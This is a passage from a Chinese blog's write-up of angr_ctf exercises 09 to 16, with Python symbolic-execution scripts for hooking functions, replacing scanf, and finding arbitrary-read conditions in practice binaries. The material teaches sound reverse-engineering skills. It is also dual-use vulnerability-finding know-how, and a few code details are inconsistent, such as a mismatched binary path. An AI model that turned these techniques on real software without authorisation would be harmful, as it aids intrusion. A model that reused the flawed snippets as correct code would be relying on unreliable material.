class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>Hook回调函数格式:</p>
<blockquote>
<p>@project.hook(Hook地址,执行完Hook函数后指令往后跳转n字节)<br>def skip_check_equals_(state):</p>
<p>pass</p>
</blockquote>
<p>claripy.If(条件,条件为True时的返回值,条件为False时的返回值)  -&gt;  创建条件判断</p>
<p>claripy.BVV(值,值大小)  -&gt;  创建一个数值</p>
</blockquote>
<h2 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h2><p>IDA：</p>
<p><img src="https://s2.loli.net/2022/03/31/j3Uq5rvXifYuNGa.png" alt="main"></p>
<p>相对于上一道题更简单，只用输入一次；</p>
<p>但equals函数却混淆为了多个分支，和02一样，这样就没办法在一个地址注入；</p>
<p>所以可以用Angr 的Hook Symbol 来实现对check_equals() 函数的注入；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    binary_path = <span class="string">&#x27;./09_angr_hooks&#x27;</span></span><br><span class="line">    project = angr.Project(binary_path)</span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个类</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">mySimPro</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, user_input_addr, user_input_length</span>):</span></span><br><span class="line">            <span class="comment"># angr 输入的符号向量</span></span><br><span class="line">            angr_bvs = self.state.memory.load(</span><br><span class="line">                user_input_addr,</span><br><span class="line">                user_input_length</span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># 目标字符串</span></span><br><span class="line">            desired = <span class="string">&#x27;MRXJKZYRKMKENFZB&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> claripy.If(</span><br><span class="line">                desired == angr_bvs, <span class="comment"># 条件判断</span></span><br><span class="line">                claripy.BVV(<span class="number">1</span>,<span class="number">32</span>), <span class="comment"># 返回值设置</span></span><br><span class="line">                claripy.BVV(<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line">            )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># hook 的函数名</span></span><br><span class="line">    check_symbol = <span class="string">&#x27;check_equals_MRXJKZYRKMKENFZB&#x27;</span></span><br><span class="line">    <span class="comment"># 创建 hook</span></span><br><span class="line">    project.hook_symbol(check_symbol,mySimPro())    <span class="comment"># 创建一个类来继承 angr.SimProcedure</span></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        solution = solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(solution.decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>Hook 回调函数格式:</p>
<blockquote>
<p>class ReplacementCheckEquals(angr.SimProcedure):</p>
<p>def run(self, Hook的函数参数列表):</p>
<p>​    ….</p>
<p>​    return 函数返回值   # 如果是void函数可以省略</p>
</blockquote>
<p>project.hook_symbol(要Hook的函数名,SimProcedure类实例)</p>
</blockquote>
<h2 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h2><p>IDA：</p>
<p><img src="https://s2.loli.net/2022/03/31/fC9AO8P2ni3cz76.png" alt="main"></p>
<p>这道题是注入系统函数scanf改变符号；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, scanf0_address, scanf1_address </span>):</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">4</span> * <span class="number">8</span>)</span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">4</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>] = scanf0</span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>] = scanf1</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Good Job&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(stdout_output)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Try again&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(stdout_output)</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    stored_solutions0 = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>]</span><br><span class="line">    stored_solutions1 = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>]</span><br><span class="line">    solution0 = solution_state.se.<span class="built_in">eval</span>(stored_solutions0)</span><br><span class="line">    solution1 = solution_state.se.<span class="built_in">eval</span>(stored_solutions1)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(solution0,solution1)</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h2 id="12-angr-veritesting"><a href="#12-angr-veritesting" class="headerlink" title="12_angr_veritesting"></a>12_angr_veritesting</h2><p>这个示例和01 题是一样的,唯独不同的一点是这个循环比之前的要大,导致直接用01 题的解题方法不能直接计算出结果,因为循环过大导致路径爆炸,所以在执行的时候会消耗很多资源.</p>
<p>project.factory.simgr() 函数提供veritesting 参数来指定是否要自动合并路径,避免路径爆炸的问题.具体细节参考论文:<a target="_blank" rel="noopener" href="https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos%20et%20al._2014_Enhancing%20Symbolic%20Execution%20with%20Veritesting.pdf">https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos%20et%20al._2014_Enhancing%20Symbolic%20Execution%20with%20Veritesting.pdf</a></p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    binary_path = <span class="string">&#x27;.//12_angr_veritesting&#x27;</span></span><br><span class="line">    project = angr.Project(binary_path)</span><br><span class="line"></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line">    simulation = project.factory.simgr(initial_state, veritesting=<span class="literal">True</span>) <span class="comment"># 设置自动合并路径</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        solution = solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>project.factory.simgr(初始化状态,veritesting = True)  -&gt;  veritesting 默认为False</p>
</blockquote>
<h2 id="13-angr-static-binary"><a href="#13-angr-static-binary" class="headerlink" title="13_angr_static_binary"></a>13_angr_static_binary</h2><p>与01一样，唯一不同的这个程序是静态链接编译，程序中包含libc的函数实现；在CTF中，这些函数会隐藏一些出题人的坑，或者这些函数不适配当前的系统；所以需要注入这些libc函数；</p>
<p>Angr库里自带一部分打包好的libc函数，直接导入即可；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">project = angr.Project(sys.argv[<span class="number">1</span>])</span><br><span class="line">initial_state = project.factory.entry_state()</span><br><span class="line">simulation = project.factory.simgr(initial_state,veritesting = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">project.hook(<span class="number">0x804ed40</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">project.hook(<span class="number">0x804ed80</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">project.hook(<span class="number">0x804f350</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">project.hook(<span class="number">0x8048d10</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">  stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(stdout_output)  <span class="comment"># :boolean</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">  stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Try again.&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(stdout_output)  <span class="comment"># :boolean</span></span><br><span class="line"></span><br><span class="line">simulation.explore(find = is_successful,avoid = should_abort)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found :</span><br><span class="line">  solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">  <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>angr.SIM_PROCEDURES[ 系统库名 ] [ 系统函数名 ] ()  -&gt;  获取Angr 内部实现的系统函数</p>
</blockquote>
<h2 id="14-angr-shared-library"><a href="#14-angr-shared-library" class="headerlink" title="14_angr_shared_library"></a>14_angr_shared_library</h2><p>IDA：</p>
<p><img src="https://s2.loli.net/2022/03/31/pr89tq3JLC5ogKu.png" alt="main"></p>
<p>类似01，但validate函数是一个动态链接库的函数；</p>
<p>对动态链接库中的_validate 函数进行符号执行；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = sys.argv[<span class="number">1</span>]  <span class="comment">#  注意是要load so 库而不是执行程序</span></span><br><span class="line"></span><br><span class="line">  base = <span class="number">0x400000</span>  <span class="comment">#  base 基址是随意定的,可以随意修改</span></span><br><span class="line">  project = angr.Project(path_to_binary, load_options=&#123;</span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span> : &#123;</span><br><span class="line">      <span class="string">&#x27;custom_base_addr&#x27;</span> : base</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  buffer_pointer = claripy.BVV(<span class="number">0x3000000</span>, <span class="number">32</span>)  <span class="comment">#  创建一个buffer 指针值</span></span><br><span class="line">  validate_function_address = base + <span class="number">0x6D7</span></span><br><span class="line">  initial_state = project.factory.call_state(validate_function_address, buffer_pointer,claripy.BVV(<span class="number">8</span>, <span class="number">32</span>))  <span class="comment">#  调用validate_function,因为函数声明validata_function(buffer_point,buffer_length) ,所以构造出调用validata_function(0x3000000,0x8) .</span></span><br><span class="line"></span><br><span class="line">  password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span> * <span class="number">8</span>)  <span class="comment">#  创建一个求解对象,大小为8 字节</span></span><br><span class="line">  initial_state.memory.store(buffer_pointer, password)  <span class="comment">#  保存到0x30000000</span></span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  simulation.explore(find = base + <span class="number">0x783</span>)  <span class="comment">#  执行到validate 函数的RETN 指令</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution_state.add_constraints(solution_state.regs.eax != <span class="number">0</span>)  <span class="comment">#  记得,要求validate 函数的返回值为1 的时候就是有解的,那么就需要在求解的时候添加上这么一个求解约束条件EAX 不能为False .</span></span><br><span class="line">    solution = solution_state.se.<span class="built_in">eval</span>(password)</span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br></pre></td></tr></table></figure>



<h2 id="15-angr-arbitrary-read"><a href="#15-angr-arbitrary-read" class="headerlink" title="15_angr_arbitrary_read"></a>15_angr_arbitrary_read</h2><p>IDA：</p>
<p><img src="https://s2.loli.net/2022/03/31/Iml48SzeWontsDP.png" alt="main"></p>
<p>控制输入；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span>  <span class="comment">#  实现Scanf Hook 函数</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, check_key_address,input_buffer_address</span>):</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">4</span> * <span class="number">8</span>)   <span class="comment"># check_key</span></span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">20</span> * <span class="number">8</span>)  <span class="comment"># input_buffer</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> scanf1.chop(bits=<span class="number">8</span>):</span><br><span class="line">        self.state.add_constraints(char &gt;= <span class="string">&#x27;0&#x27;</span>, char &lt;= <span class="string">&#x27;z&#x27;</span>)  <span class="comment">#  对input_buffer 的输入约束</span></span><br><span class="line"></span><br><span class="line">      self.state.memory.store(check_key_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      self.state.memory.store(input_buffer_address, scanf1,endness=project.arch.memory_endness)  <span class="comment">#  保存求解变量到指定的内存中</span></span><br><span class="line"></span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>] = scanf0  <span class="comment">#  保存这两个变量到state 中,后续求解需要用到</span></span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>] = scanf1</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())  <span class="comment">#  Hook scanf 函数</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">check_puts</span>(<span class="params">state</span>):</span></span><br><span class="line">    puts_parameter = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=project.arch.memory_endness)  <span class="comment">#  获取puts() 函数的参数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> state.se.symbolic(puts_parameter):  <span class="comment">#  检查这个参数是否为符号化对象</span></span><br><span class="line">      good_job_string_address = <span class="number">0x4D525854B</span></span><br><span class="line"></span><br><span class="line">      copied_state = state.copy()  <span class="comment">#  复制执行状态上下文进行约束求解,不影响原理的执行上下文</span></span><br><span class="line"></span><br><span class="line">      copied_state.add_constraints(puts_parameter == good_job_string_address)  <span class="comment">#  puts 的参数地址是否可以被指定为0x4D525854B ,如果可以的话,那就证明这个值是可控的</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> copied_state.satisfiable():  <span class="comment">#  判断添加了上面这个约束是否有解</span></span><br><span class="line">        state.add_constraints(puts_parameter == good_job_string_address)  <span class="comment">#  如果有解的话就保存到执行的那个状态对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    puts_address = <span class="number">0x8048370</span>  <span class="comment">#  当程序执行到puts() 函数时,就认为路径探索到了这里,然后再去通过check_puts() 判断这里是否存在漏洞,告诉Angr这是不是需要找的那条执行路径</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> state.addr == puts_address:</span><br><span class="line">      <span class="keyword">return</span> check_puts(state)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution0 = solution_state.se.<span class="built_in">eval</span>(solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>])</span><br><span class="line">    solution1 = solution_state.se.<span class="built_in">eval</span>(solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>],cast_to=<span class="built_in">bytes</span>)  <span class="comment">#  输出字符串序列化的内容</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(solution0,solution1)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>state.copy()  -&gt;  复制状态上下文</p>
<p>state.satisfiable()  -&gt;  判断当前的所有约束是否有解</p>
<p>solution_state.se.eval(求解变量,cast_to=bytes)  -&gt;  序列化变量内容为字符串</p>
</blockquote>
<h2 id="16-angr-arbitrary-write"><a href="#16-angr-arbitrary-write" class="headerlink" title="16_angr_arbitrary_write"></a>16_angr_arbitrary_write</h2><p>IDA：</p>
<p><img src="https://s2.loli.net/2022/03/31/kJgMtn8Elydj2QO.png" alt="main"></p>
<p>控制写入内存；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 